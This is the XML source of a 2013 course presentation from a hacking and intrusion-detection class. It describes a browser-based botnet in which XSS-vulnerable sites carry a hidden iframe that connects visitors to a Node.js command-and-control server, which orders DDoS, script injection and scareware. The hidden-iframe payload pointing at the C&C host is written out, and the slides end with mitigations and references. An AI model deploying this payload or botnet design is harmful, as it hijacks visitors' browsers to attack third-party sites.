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ff66" draw:textarea-horizontal-align="justify" draw:textarea-vertical-align="middle" draw:auto-grow-height="false" fo:min-height="0cm" fo:min-width="0cm" fo:wrap-option="no-wrap"/>
    </style:style>
    <style:style style:name="gr3" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:stroke="none" draw:fill="solid" draw:fill-color="#000000"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solid" draw:fill-color="#996633" draw:textarea-horizontal-align="justify" draw:textarea-vertical-align="middle" draw:auto-grow-height="false"/>
    </style:style>
    <style:style style:name="gr8" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#99ccff" draw:textarea-horizontal-align="justify" draw:textarea-vertical-align="middle" draw:auto-grow-height="false"/>
    </style:style>
    <style:style style:name="gr9" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#00b8ff" draw:textarea-horizontal-align="justify" draw:textarea-vertical-align="middle" draw:auto-grow-height="false"/>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2.18cm"/>
    </style:style>
    <style:style style:name="P1" style:family="paragraph">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:text-indent="0cm" style:writing-mode="lr-tb"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:text-indent="0cm" style:writing-mode="lr-tb"/>
      <style:text-properties fo:font-family="'Liberation Sans'" style:font-family-generic="swiss" style:font-pitch="variable" fo:font-size="54pt" fo:text-shadow="none" style:font-size-asian="54pt" style:font-family-complex="'Droid Arabic Naskh'" style:font-pitch-complex="variable" style:font-size-complex="54pt"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph">
      <style:text-properties fo:font-family="'Droid Sans'" style:font-family-generic="swiss" style:font-pitch="variable"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph">
      <style:paragraph-properties fo:text-align="center"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph">
      <style:paragraph-properties fo:text-align="center"/>
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph">
      <style:paragraph-properties fo:text-align="center"/>
      <style:text-properties fo:color="#ffffff" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph">
      <style:paragraph-properties fo:text-align="center"/>
      <style:text-properties fo:color="#ffffff"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:text-align="start" fo:text-indent="0cm"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:text-indent="0cm"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:font-family="'Liberation Sans'" style:font-family-generic="swiss" style:font-pitch="variable" fo:font-size="54pt" fo:text-shadow="none" fo:font-weight="bold" style:font-size-asian="54pt" style:font-weight-asian="bold" style:font-family-complex="'Droid Arabic Naskh'" style:font-pitch-complex="variable" style:font-size-complex="54pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:font-family="'Liberation Sans'" style:font-family-generic="swiss" style:font-pitch="variable" fo:font-size="28pt" fo:text-shadow="none" style:font-size-asian="28pt" style:font-family-complex="'Droid Arabic Naskh'" style:font-pitch-complex="variable" style:font-size-complex="28pt"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:font-family="'Liberation Sans'" style:font-family-generic="swiss" style:font-pitch="variable" fo:font-size="20pt" fo:text-shadow="none" style:font-size-asian="20pt" style:font-family-complex="'Droid Arabic Naskh'" style:font-pitch-complex="variable" style:font-size-complex="20pt"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:font-family="'Liberation Sans'" style:font-family-generic="swiss" style:font-pitch="variable" fo:font-size="18pt" fo:text-shadow="none" style:font-size-asian="18pt" style:font-family-complex="'Droid Arabic Naskh'" style:font-pitch-complex="variable" style:font-size-complex="18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26pt" fo:font-weight="bold" style:font-size-asian="26pt" style:font-weight-asian="bold" style:font-size-complex="26pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:color="#ffffff" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:color="#ffffff"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:font-family="Mono" style:font-pitch="fixed" fo:font-size="16pt" fo:font-weight="bold" style:font-size-asian="16pt" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:font-family="Mono" style:font-pitch="fixed" fo:font-size="22pt" fo:font-weight="normal" style:font-size-asian="22pt" style:font-weight-asian="normal" style:font-size-complex="22pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties fo:font-size="26pt" fo:font-style="italic" fo:font-weight="normal" style:font-size-asian="26pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="26pt"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4.639cm" svg:height="13.149cm" svg:x="1.4cm" svg:y="4.427cm" presentation:class="subtitle" presentation:user-transformed="true">
          <draw:text-box>
            <text:p text:style-name="P1"><text:span text:style-name="T1">Standard Complaint</text:span></text:p>
            <text:p text:style-name="P1"><text:span text:style-name="T1">Botnet</text:span></text:p>
            <text:p text:style-name="P1"><text:span text:style-name="T2"/></text:p>
            <text:p text:style-name="P1"><text:span text:style-name="T2"/></text:p>
            <text:p text:style-name="P1"><text:span text:style-name="T3">Course: Hacking Techniques and Intrusion Detection</text:span></text:p>
            <text:p text:style-name="P1"><text:span text:style-name="T3">Instructor: Dr. Ali H. Hadi</text:span></text:p>
            <text:p text:style-name="P1"><text:span text:style-name="T3">MSc. Computer Information Systems Security and Digital Criminology</text:span></text:p>
            <text:p text:style-name="P1"><text:span text:style-name="T2"/></text:p>
            <text:p text:style-name="P1"><text:span text:style-name="T2"/></text:p>
            <text:p text:style-name="P1"><text:span text:style-name="T4">Omar Al-Ithawi </text:span></text:p>
            <text:p text:style-name="P1"><text:span text:style-name="T4">Web Developer, Eqra Tech. LLC</text:span></text:p>
            <text:p text:style-name="P1"><text:span text:style-name="T4"><text:a xlink:href="mailto:i@omardo.com">i@omardo.com</text:a></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Default-subtitle" draw:layer="layout" svg:width="24.639cm" svg:height="1.267cm" svg:x="1.4cm" svg:y="10.37cm" presentation:class="subtitle" presentation:user-transformed="true">
          <draw:text-box>
            <text:p>Please open <text:span text:style-name="T5"><text:a xlink:href="http://omardo.com/">http://omardo.com</text:a></text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr3" draw:text-style-name="P3" draw:layer="layout" svg:width="25.199cm" svg:height="3.506cm" svg:x="1.4cm" svg:y="0.837cm" presentation:class="title" presentation:user-transformed="true">
          <draw:text-box>
            <text:p>Demo First<text:tab/></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s going on?</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="24.639cm" svg:height="12.18cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p>The site has a malicious code</text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T5">You're MY bot</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Unless … you check things</text:p>
                <text:list>
                  <text:list-item>
                    <text:p><text:span text:style-name="T6">In Google Chrome press Shift+Ctrl+J</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tandard Compliance</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="24.639cm" svg:height="12.18cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="outline">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p>Any browser that refuses to obey my orders, is NOT standard compliant:</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>W3C: HTML, CSS</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>WHATWG: WebSocket</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>ECMA: ECMAScript a.k.a. JavaScript<text:line-break/><text:line-break/></text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p>Works on:</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Desktop: IE, Chrome, Firefox</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Mobile: Android, iPhone and BB</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Amazon Kindle!</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draw:custom-shape draw:style-name="gr2" draw:text-style-name="P5" draw:layer="layout" svg:width="8.442cm" svg:height="7.62cm" svg:x="19.244cm" svg:y="12.446cm">
          <text:p text:style-name="P4"><text:span text:style-name="T5"><text:s text:c="14"/></text:span><text:span text:style-name="T7">Botnet</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5" draw:layer="layout" svg:width="25.199cm" svg:height="3.506cm" svg:x="1.4cm" svg:y="0.837cm" presentation:class="title">
          <draw:text-box>
            <text:p>Botnet Topology</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="12.023cm" svg:height="12.18cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="outline">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p>Site with XSS vulnerability</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>A visitor will connect to the Botmaster</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Perform HTTP DDoS</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Realtime C&amp;C</text:p>
              </text:list-item>
            </text:list>
          </draw:text-box>
        </draw:frame>
        <draw:custom-shape draw:style-name="gr3" draw:text-style-name="P6" xml:id="id9" draw:id="id9" draw:layer="layout" svg:width="2.794cm" svg:height="2.772cm" svg:x="16.256cm" svg:y="5.334cm">
          <text:p text:style-name="P4"><text:span text:style-name="T8">Bot-</text:span></text:p>
          <text:p text:style-name="P4"><text:span text:style-name="T8">ma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2" draw:id="id2" draw:layer="layout" svg:width="2.286cm" svg:height="3.302cm" svg:x="15.748cm" svg:y="11.938cm">
          <text:p text:style-name="P4"><text:span text:style-name="T5">XSS</text:span></text:p>
          <text:p text:style-name="P4"><text:span text:style-name="T5">Vuln.</text:span></text:p>
          <text:p text:style-name="P4"><text:span text:style-name="T5">Site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4" xml:id="id8" draw:id="id8" draw:layer="layout" svg:width="1.778cm" svg:height="1.778cm" svg:x="22.606cm" svg:y="17.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4" xml:id="id3" draw:id="id3" draw:layer="layout" svg:width="1.778cm" svg:height="1.778cm" svg:x="19.866cm" svg:y="16.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6" draw:text-style-name="P4" draw:layer="layout" draw:type="line" svg:x1="25.66cm" svg:y1="15.754cm" svg:x2="18.034cm" svg:y2="13.303cm" draw:start-shape="id1" draw:start-glue-point="5" draw:end-shape="id2" draw:end-glue-point="9" svg:d="m25660 15754-7626-2451">
          <text:p/>
        </draw:connector>
        <draw:connector draw:style-name="gr6" draw:text-style-name="P4" draw:layer="layout" draw:type="line" svg:x1="19.866cm" svg:y1="17.599cm" svg:x2="18.288cm" svg:y2="18.129cm" draw:start-shape="id3" draw:start-glue-point="6" draw:end-shape="id4" draw:end-glue-point="9" svg:d="m19866 17599-1578 530">
          <text:p/>
        </draw:connector>
        <draw:connector draw:style-name="gr6" draw:text-style-name="P4" draw:layer="layout" draw:type="line" svg:x1="20.58cm" svg:y1="14.738cm" svg:x2="18.034cm" svg:y2="13.303cm" draw:start-shape="id5" draw:start-glue-point="5" draw:end-shape="id2" draw:end-glue-point="9" svg:d="m20580 14738-2546-1435">
          <text:p/>
        </draw:connector>
        <draw:connector draw:style-name="gr6" draw:text-style-name="P4" draw:layer="layout" draw:type="line" svg:x1="22.606cm" svg:y1="16.383cm" svg:x2="15.494cm" svg:y2="16.097cm" draw:start-shape="id6" draw:start-glue-point="6" draw:end-shape="id7" draw:end-glue-point="9" svg:d="m22606 16383-7112-286">
          <text:p/>
        </draw:connector>
        <draw:connector draw:style-name="gr6" draw:text-style-name="P4" draw:layer="layout" draw:type="line" svg:x1="22.866cm" svg:y1="19.298cm" svg:x2="18.288cm" svg:y2="18.415cm" draw:start-shape="id8" draw:start-glue-point="7" draw:end-shape="id4" svg:d="m22866 19298-4578-883">
          <text:p/>
        </draw:connector>
        <draw:custom-shape draw:style-name="gr5" draw:text-style-name="P4" xml:id="id5" draw:id="id5" draw:layer="layout" svg:width="1.778cm" svg:height="1.778cm" svg:x="20.32cm" svg:y="14.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4" xml:id="id1" draw:id="id1" draw:layer="layout" svg:width="1.778cm" svg:height="1.778cm" svg:x="25.4cm" svg:y="15.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4" xml:id="id6" draw:id="id6" draw:layer="layout" svg:width="1.778cm" svg:height="1.778cm" svg:x="22.606cm" svg:y="15.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6" draw:text-style-name="P4" draw:layer="layout" draw:type="curve" svg:x1="17.653cm" svg:y1="8.106cm" svg:x2="21.009cm" svg:y2="12.756cm" draw:start-shape="id9" draw:start-glue-point="8" svg:d="m17653 8106c0 3864 3356 1539 3356 4650">
          <text:p/>
        </draw:connector>
        <draw:custom-shape draw:style-name="gr7" draw:text-style-name="P7" draw:layer="layout" svg:width="2.54cm" svg:height="3.531cm" svg:x="23.622cm" svg:y="4.064cm">
          <text:p text:style-name="P4"><text:span text:style-name="T9">DDoS</text:span></text:p>
          <text:p text:style-name="P4"><text:span text:style-name="T9">Victi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 draw:text-style-name="P4" draw:layer="layout" svg:x1="21.336cm" svg:y1="12.446cm" svg:x2="23.465cm" svg:y2="8.128cm">
          <text:p/>
        </draw:line>
        <draw:line draw:style-name="gr6" draw:text-style-name="P4" draw:layer="layout" svg:x1="22.86cm" svg:y1="11.938cm" svg:x2="23.876cm" svg:y2="8.128cm">
          <text:p/>
        </draw:line>
        <draw:line draw:style-name="gr6" draw:text-style-name="P4" draw:layer="layout" svg:x1="24.13cm" svg:y1="12.192cm" svg:x2="24.384cm" svg:y2="8.128cm">
          <text:p/>
        </draw:line>
        <draw:line draw:style-name="gr6" draw:text-style-name="P4" draw:layer="layout" svg:x1="25.146cm" svg:y1="12.192cm" svg:x2="24.892cm" svg:y2="8.128cm">
          <text:p/>
        </draw:line>
        <draw:line draw:style-name="gr6" draw:text-style-name="P4" draw:layer="layout" svg:x1="26.67cm" svg:y1="12.192cm" svg:x2="25.654cm" svg:y2="8.382cm">
          <text:p/>
        </draw:line>
        <draw:line draw:style-name="gr6" draw:text-style-name="P4" draw:layer="layout" svg:x1="25.908cm" svg:y1="11.938cm" svg:x2="25.4cm" svg:y2="9.144cm">
          <text:p/>
        </draw:line>
        <draw:line draw:style-name="gr6" draw:text-style-name="P4" draw:layer="layout" svg:x1="24.638cm" svg:y1="11.938cm" svg:x2="24.638cm" svg:y2="9.144cm">
          <text:p/>
        </draw:line>
        <draw:line draw:style-name="gr6" draw:text-style-name="P4" draw:layer="layout" svg:x1="23.622cm" svg:y1="11.43cm" svg:x2="23.876cm" svg:y2="9.398cm">
          <text:p/>
        </draw:line>
        <draw:line draw:style-name="gr6" draw:text-style-name="P4" draw:layer="layout" svg:x1="22.098cm" svg:y1="12.192cm" svg:x2="23.465cm" svg:y2="8.89cm">
          <text:p/>
        </draw:line>
        <draw:custom-shape draw:style-name="gr8" draw:text-style-name="P5" xml:id="id7" draw:id="id7" draw:layer="layout" svg:width="2.286cm" svg:height="3.302cm" svg:x="13.208cm" svg:y="14.732cm">
          <text:p text:style-name="P4"><text:span text:style-name="T5">XSS</text:span></text:p>
          <text:p text:style-name="P4"><text:span text:style-name="T5">Vuln.</text:span></text:p>
          <text:p text:style-name="P4"><text:span text:style-name="T5">Site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5" xml:id="id4" draw:id="id4" draw:layer="layout" svg:width="2.286cm" svg:height="3.302cm" svg:x="16.002cm" svg:y="16.764cm">
          <text:p text:style-name="P4"><text:span text:style-name="T5">XSS</text:span></text:p>
          <text:p text:style-name="P4"><text:span text:style-name="T5">Vuln.</text:span></text:p>
          <text:p text:style-name="P4"><text:span text:style-name="T5">Site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Available Orders</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="24.639cm" svg:height="12.18cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p>img: &lt;img /&gt; attack</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>iframe: &lt;iframe /&gt; attack</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>go: File download – remember the PDF?</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>eval: JavaScript eval()</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>alert: alert() – scareware!</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>appendsrc: inject mal. JavaScript's</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>append: inject HTML code</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>stop: stop the attack, Obviously</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>log: debug message in the console</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Details: XSS</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="24.639cm" svg:height="12.18cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:p text:style-name="P8">The code, is a small HTML snippet:</text:p>
            <text:p text:style-name="P8"><text:span text:style-name="T10"/></text:p>
            <text:p text:style-name="P8"><text:span text:style-name="T11">&lt;iframe</text:span></text:p>
            <text:p text:style-name="P8"><text:span text:style-name="T11">src="</text:span><text:span text:style-name="T11"><text:a xlink:href="http://httpcnc.jit.su/">http://httpcnc.jit.su/</text:a></text:span><text:span text:style-name="T11">" </text:span></text:p>
            <text:p text:style-name="P8"><text:span text:style-name="T11">style="border: 0; width: 0; height: 0"&gt;</text:span></text:p>
            <text:p text:style-name="P8"><text:span text:style-name="T11">&lt;/iframe&gt;</text:span></text:p>
            <text:p/>
            <text:p>Any XSS vulnerable website</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Details: Botmaster</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="24.639cm" svg:height="12.18cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="outline">
          <draw:text-box>
            <text:p>Orders through WebSockets:</text:p>
            <text:p>The bot-master (Node.js server) could issue commands in real-time.</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Details: Bot</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="24.639cm" svg:height="12.18cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:p>Attacks are simple HTTP requests, but in a frequent manner to perform DoS, with many browsing bots it is <text:span text:style-name="T5">DDoS</text:span><text:span text:style-name="T12">.</text:span></text:p>
            <text:p><text:span text:style-name="T12"/></text:p>
            <text:p><text:span text:style-name="T13">In this part <text:s/></text:span><text:span text:style-name="T13"><text:a xlink:href="https://code.google.com/p/lowc/">https://code.google.com/p/lowc/</text:a></text:span><text:span text:style-name="T13">is being used as the attacking module.</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You Can Do It!</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="24.639cm" svg:height="12.18cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="outline">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p>All the software being used are free/open-source softwares.</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Mainly:<text:span text:style-name="T13"> <text:s/></text:span><text:span text:style-name="T13"><text:a xlink:href="https://code.google.com/p/lowc/">https://code.google.com/p/lowc/</text:a></text:span></text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p>The services are free-of-charge as well:</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Node.js hosting: <text:a xlink:href="http://nodejitsu.com/">http://nodejitsu.com</text:a></text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Google Analytics: <text:a xlink:href="http://google.com/analytics">http://google.com/analytics</text:a></text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Your browser ;)</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layer="layout" svg:width="25.199cm" svg:height="3.506cm" svg:x="1.4cm" svg:y="0.837cm" presentation:class="title">
          <draw:text-box>
            <text:p>Mitigations?</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr6" draw:text-style-name="P9" draw:layer="layout" svg:width="24.639cm" svg:height="12.18cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="subtitle">
          <draw:text-box>
            <text:list text:style-name="L1">
              <text:list-header>
                <text:p text:style-name="P9">This is a pretty weak Botnet, can you think of a technique?</text:p>
              </text:list-header>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506cm" svg:x="1.4cm" svg:y="0.837cm" presentation:class="title">
          <draw:text-box>
            <text:p>Possible Mitigations</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="24.639cm" svg:height="12.18cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p>Disable JavaScript?<text:line-break/></text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Signature based site blocking:</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Search Engines</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Websites<text:line-break/></text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p>Service Providers:</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>ISP</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Hosting</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draw:text-box>
            <text:p>Thanks</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="24.639cm" svg:height="12.18cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:p><text:span text:style-name="T14">References</text:span><text:span text:style-name="T5">:</text:span></text:p>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p>Zant95, LOWC, <text:a xlink:href="https://code.google.com/p/lowc/">https://code.google.com/p/lowc/</text:a>, accessed: Jan 14, 2012</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>NewEraCracker, LOIC, <text:a xlink:href="https://github.com/NewEraCracker/LOIC">https://github.com/NewEraCracker/LOIC</text:a>, accessed: Jan 14, 2012</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>G. Fedynyshyn , M. C. Chuah, and G. Tan, Detection and Classification of Different Botnet C&amp;C Channels, 2011</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>F. Giroire, J. Chandrashekar, N. Taft, E. Schooler, and D. Papagiannaki, Exploiting Temporal Persistence to DetectCovert Botnet Channels, 2009</text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T15">S. S. Sidhom, Botnets, 2012</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T15">Mi Joo KIM, <text:s/>Botnet detection and response technology, 2008</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T15">Jeong, Hyun Cheol, Botnet C&amp;C Handling with DNS Sinkhole, 2007</text:span></text:p>
                <text:p><text:span text:style-name="T15"/></text:p>
              </text:list-item>
            </text:list>
            <text:p><text:span text:style-name="T14">Links:</text:span></text:p>
            <text:list text:continue-numbering="true" text:style-name="L2">
              <text:list-item>
                <text:p>Node.js <text:a xlink:href="http://nodejs.org/">http://nodejs.org/</text:a></text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Google Analytics <text:a xlink:href="http://google.com/analytics">http://google.com/analytics</text:a></text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Node.js hosting: <text:a xlink:href="http://nodejitsu.com/">http://nodejitsu.com</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ar" style:country-complex="EG"/>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mar </meta:initial-creator>
    <meta:creation-date>2013-01-03T01:31:09</meta:creation-date>
    <dc:date>2013-01-14T16:59:55</dc:date>
    <dc:creator>omar </dc:creator>
    <meta:editing-duration>PT7H34M53S</meta:editing-duration>
    <meta:editing-cycles>57</meta:editing-cycles>
    <meta:generator>LibreOffice/3.5$Linux_X86_64 LibreOffice_project/350m1$Build-2</meta:generator>
    <meta:document-statistic meta:object-count="98"/>
  </office:meta>
</office:document-meta>
</file>